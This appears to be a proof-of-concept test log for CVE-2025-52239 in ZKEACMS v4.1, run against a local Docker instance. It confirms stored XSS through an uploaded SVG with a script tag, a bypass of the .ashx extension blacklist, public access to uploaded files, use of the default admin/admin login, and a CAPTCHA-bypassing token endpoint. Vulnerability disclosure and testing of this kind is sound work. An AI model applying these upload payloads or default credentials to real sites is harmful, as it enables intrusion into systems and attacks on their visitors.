============================================================
CVE-2025-52239 - ZKEACMS v4.1 Arbitrary File Upload PoC
============================================================
Date: 2026-02-03
Environment: Docker zkeasoft/zkeacms:v4.1
Target: http://localhost:8080

[*] Step 1: Login via browser (CAPTCHA required)
[+] Logged in successfully with admin/admin

[*] Step 2: Testing file upload vulnerability

Test 1: poc_xss.svg (SVG with JavaScript)
[+] UPLOADED: /UpLoad/Images/202602/b5l5k26ettds.svg
[+] Content verified - JavaScript present:
    <svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS-CVE-2025-52239")</script></svg>
[+] File publicly accessible without authentication

Test 2: poc_handler.ashx (ASP.NET Handler)
[+] UPLOADED: /UpLoad/Files/202602/b5l5kwyeaeww.ashx
[+] Extension .ashx NOT in blacklist - upload successful

============================================================
RESULT: VULNERABLE
============================================================

Vulnerability Confirmed:
1. SVG files with JavaScript can be uploaded (stored XSS)
2. .ashx files can be uploaded (blacklist bypass)
3. Uploaded files are publicly accessible

Impact:
- Stored XSS via malicious SVG files
- Potential code execution if server processes .ashx/.cshtml files

Note on CVSS PR:N:
- Login requires CAPTCHA, so technically PR:L (Low privileges)
- However, default credentials (admin/admin) are well-known
- API endpoint /api/account/CreateToken bypasses CAPTCHA for JWT
  (but JWT not accepted by Media upload endpoint)

============================================================
